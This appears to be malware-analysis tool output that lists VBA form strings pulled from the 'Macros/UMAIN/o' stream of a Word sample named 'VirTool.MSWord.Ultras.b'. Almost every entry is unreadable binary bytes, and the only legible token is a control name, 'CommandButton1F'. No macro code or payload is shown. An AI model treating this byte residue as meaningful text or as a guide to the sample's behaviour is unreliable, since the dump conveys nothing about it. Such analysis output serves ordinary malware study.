-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
￿����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PP����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



DDD
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j@@�``�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v������@@}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������((*--/114558���mmo??CBBEDDG������������������BBE??B;;>iik������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D@@�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�࿿�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�00�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ϯ��������  �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
῿��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
翿����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@B�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9������PP�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h  �@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m@@�������@@z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������((*,,/113558���nnp@@CCCFEEI������������������DDHAAE>>A���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
PPS@@Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<@@{����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ݿ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�꿿�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00�``�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
쏏�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@忿�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ʿ���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ѿ�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
``a���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
dpp�������@@v
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������''*,,/114558���nnqAADDDGFFJ������������������GGKEEHBBE���������������!!#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@@J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3@@u����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ڿ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�꿿�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�``��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PP�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@ֿ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y�������PP~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������@@I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���WWW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������557--/114669���ooqBBFEEIHHL������������������KKOHHLFFIqqt������������&&(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@@D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)@@m������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ֿ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�``�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�돏�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����00�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@Ư��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����  �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������@@J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������yyz--022577:aac@@DDDHHHKbbe������������������OOSMMQJJNGGJBBF>>A������,,.%%'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^^_���BBC
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@e������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
䏏�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
⿿����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
˯�쿿�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i���``�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�  �������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������  +
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A������������00X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
``o������@@L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������;;>44799<>>ABBFFFJJJN���������������������SSXQQVOOSLLPHHLCCG������224++-##%������GGG
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@[������pp�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������  �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�``п��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t``����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
˿��������������������QQSNNPKKLHHIEEE������ppv@@N@@U@@\@@b���������@@q@@n@@m@@k@@h@@g����������������  @
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 00H������������ppz@@I@@D@@ADDDGGGxxx�����������������偁�GGJ@@CEEH��������������������������������}}�zz}wwz������jjleeg__a������zzzFFF@@Cpp|������������00�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�  ��������������@@�@@�@@�@@�@@�``쏏��������@@�@@�@@�������pp�@@�@@�PP����@@�@@�@@�@@�@@�``����������@@x@@t@@q@@n@@k@@j@@h@@h@@g���������``�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
FPP�������������@@�@@�@@�@@�@@�@@�ֿ��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
CommandButton1F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
